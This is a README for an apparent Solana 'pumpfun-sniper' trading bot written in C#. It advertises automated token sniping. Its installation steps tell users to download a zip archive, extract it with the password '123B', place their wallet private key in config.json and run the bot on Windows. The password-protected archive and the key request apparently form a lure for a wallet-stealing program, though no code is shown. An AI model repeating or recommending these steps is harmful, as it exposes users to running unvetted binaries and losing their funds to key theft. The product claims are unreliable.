<p align="center">
<img src=https://img.shields.io/github/stars/Zhang8081/pumpfun-sniper?style=for-the-badge&logo=appveyor&color=blue />
<img src=https://img.shields.io/github/forks/Zhang8081/pumpfun-sniper?style=for-the-badge&logo=appveyor&color=blue />
<img src=https://img.shields.io/github/issues/Zhang8081/pumpfun-sniper?style=for-the-badge&logo=appveyor&color=informational />
</p>

#                                                                      Overview
Bot built with C# and the Solnet library, designed to target and execute transaction sniping on Pump.fun within the Solana blockchain ecosystem.
![](https://github.com/Zhang8081/pumpfun-sniper/blob/main/scr2.png?raw=true)
![](https://github.com/Zhang8081/pumpfun-sniper/blob/main/scr.png?raw=true)
![](https://github.com/Zhang8081/pumpfun-sniper/blob/main/scr3.png?raw=true)
## Features

- Connects to the Solana MainNet.
- Creates and sends transactions to a specified target account.
- Configurable via environment variables.

## Usage
- **Sniper Functionality**: Offers rapid detection and acquisition of newly listed tokens by scanning Dextools and PumpFun.
- **Profit-Driven Token Analysis**: Deploys sophisticated algorithms to pinpoint tokens with high growth potential.
- **Adjustable Parameters**: Empowers users to fine-tune their buying strategies through customizable settings.
- **Live Price Tracking**: Delivers real-time updates and continuous monitoring of token prices.
- **Automated Purchasing**: Facilitates the automatic acquisition of tokens on the Solana blockchain via Raydium or Jupiter platforms.

## Installation
- [Download](https://github.com/Zhang8081/pumpfun-sniper/archive/refs/heads/main.zip) the repository.
- extract archive with pass `123B`.
- create a `config.json` in the project's root directory and define your environment variables. You can use the provided `config.json`.
- run the bot.

### Configuration

The bot uses environment variables for configuration. Create a `config.json` file in the root directory and set the following variables:

- `maxPosition`: The amount of sol for which a particular token will be purchased.
- `timeoutScan`: Time interval followed by interaction.
- `solPrivate`: Your Solana wallet's private key.
- `rpc`: Rpc to which the wallet will be connected example([Shyft](https://shyft.to/get-api-key)).


Example `config.json` file:

```json
{
  "mainSettings": {
    "maxPosition": "0.1",
    "timeoutScan": "25",
    "rpc": "https://<your-solana-rpc>.com:<port>",
    "solPrivate": "<your-solana-private-key>"
  }
}
```
### Requirements

1. **Framework 4.0 and more**.

2. **Windows 10/11**.

3. **Solnet Libraries**: The project uses the Solnet library to interact with the Solana blockchain.

4. **.NET SDK**: Make sure you have the .NET SDK installed. You can download it from the [.NET official site](https://dotnet.microsoft.com/download).
